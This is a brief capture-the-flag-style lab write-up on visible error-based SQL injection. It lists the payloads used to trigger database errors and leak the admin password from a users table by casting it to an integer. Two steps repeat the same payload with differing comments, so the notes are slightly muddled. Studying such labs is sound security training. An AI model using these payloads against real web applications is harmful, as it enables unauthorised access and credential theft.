Lab #18 - Visible error-based SQL injection

End Goal : Exploit SQL injection to retrieve the admin user's credentials from the users
table and log into thier account.

Analysis:

SELECT * FROM tracking WHERE id = 'EKVDv4VdNqitYN4v''  -> this gives error

EKVDv4VdNqitYN4v' and (select 1)=1--  --> no error, means next step forward

' and CAST((select password from users LIMIT 1) as int)=1--   ->> no error, next step

' and CAST((select password from users LIMIT 1) as int)=1--   --> no error, got password

We leak password in ui of web app, this is how it works
Not scripting , only fuzzing
